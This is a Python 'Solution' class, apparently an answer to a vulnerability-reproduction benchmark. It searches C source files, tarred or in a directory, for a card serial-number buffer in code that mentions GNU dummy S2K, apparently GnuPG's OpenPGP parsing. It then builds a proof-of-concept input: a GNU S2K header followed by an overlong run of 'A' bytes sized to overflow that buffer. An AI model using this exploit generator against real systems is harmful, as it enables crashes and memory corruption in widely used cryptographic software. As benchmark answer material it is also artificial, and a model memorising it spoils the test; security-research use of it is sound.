import os
import re
import tarfile
from typing import Optional, Tuple


class Solution:
    def _iter_source_texts_from_tar(self, tar_path: str):
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    low_name = name.lower()
                    if not low_name.endswith((".c", ".h", ".cc", ".cpp")):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    if not data:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        text = data.decode("latin-1", "ignore")
                    if text:
                        yield name, text
        except Exception:
            return

    def _iter_source_texts_from_dir(self, root: str):
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                low = fn.lower()
                if not low.endswith((".c", ".h", ".cc", ".cpp")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        text = data.decode("latin-1", "ignore")
                    if text:
                        rel = os.path.relpath(path, root)
                        yield rel, text
                except Exception:
                    continue

    def _best_serial_buffer_candidate(self, src_path: str) -> Optional[Tuple[int, bool, int]]:
        candidates = []
        src_is_dir = os.path.isdir(src_path)

        if src_is_dir:
            it = self._iter_source_texts_from_dir(src_path)
        else:
            it = self._iter_source_texts_from_tar(src_path)

        char_array_re = re.compile(r"\bchar\s+([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*(\d+)\s*\]")
        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z0-9_]*serial[A-Za-z0-9_]*)\s+(\d+)\b", re.IGNORECASE | re.MULTILINE)

        for name, text in it:
            low = text.lower()
            if "serial" not in low or "s2k" not in low:
                continue

            file_score = 0
            if "s2k" in low:
                file_score += 5
            if "gnu" in low:
                file_score += 2
            if "dummy" in low:
                file_score += 3
            if "card" in low:
                file_score += 3
            if "openpgp" in low or "open pgp" in low:
                file_score += 2
            if "serial" in low:
                file_score += 1

            for m in char_array_re.finditer(text):
                var = m.group(1)
                try:
                    n = int(m.group(2))
                except Exception:
                    continue
                if n < 8 or n > 64:
                    continue
                vlow = var.lower()
                if "serial" not in vlow:
                    continue

                var_score = 0
                if "card" in vlow:
                    var_score += 4
                if "serialno" in vlow:
                    var_score += 3
                if "s2k" in vlow:
                    var_score += 3
                if "dummy" in vlow:
                    var_score += 1

                start = max(0, m.start() - 2500)
                end = min(len(text), m.end() + 8000)
                window = text[start:end]

                nul_term = False
                term_re = re.compile(
                    r"\b" + re.escape(var) + r"\s*\[\s*[^]\n]{1,80}\]\s*=\s*(0|'\\0'|\"\\0\")",
                    re.IGNORECASE,
                )
                if term_re.search(window):
                    nul_term = True

                primary = file_score * 20 + var_score * 5 + (10 if nul_term else 0)

                strong_ctx = (
                    ("gnu" in low) and ("dummy" in low) and ("card" in low) and ("s2k" in low) and ("serial" in low)
                )
                if strong_ctx:
                    primary += 20
                if "card" in vlow and "serial" in vlow:
                    primary += 10

                candidates.append((primary, n, nul_term))

            for dm in define_re.finditer(text):
                try:
                    n = int(dm.group(2))
                except Exception:
                    continue
                if n < 8 or n > 64:
                    continue
                primary = file_score * 15 + 5
                candidates.append((primary, n, False))

        if not candidates:
            return None

        def key(c):
            primary, n, nul_term = c
            return (primary, -abs(n - 20), -1 if nul_term else 0, -n)

        best = max(candidates, key=key)
        return best

    def _build_poc(self, serial_len: int) -> bytes:
        if serial_len < 1:
            serial_len = 1
        if serial_len > 250:
            serial_len = 250
        return bytes([0x65, 0x01]) + b"GNU" + bytes([0x01, serial_len]) + (b"A" * serial_len)

    def solve(self, src_path: str) -> bytes:
        # Default: 27 bytes total => 7 bytes overhead + 20 bytes serial
        default_serial_len = 20

        best = self._best_serial_buffer_candidate(src_path)
        if not best:
            return self._build_poc(default_serial_len)

        primary, n, nul_term = best

        # Conservative: only trust analysis to go below 20 if highly confident.
        if primary < 140:
            serial_len = default_serial_len
        else:
            if nul_term:
                serial_len = n
            else:
                serial_len = n + 1

            if serial_len < 20 and primary < 200:
                serial_len = default_serial_len

        if serial_len < 1:
            serial_len = default_serial_len

        return self._build_poc(serial_len)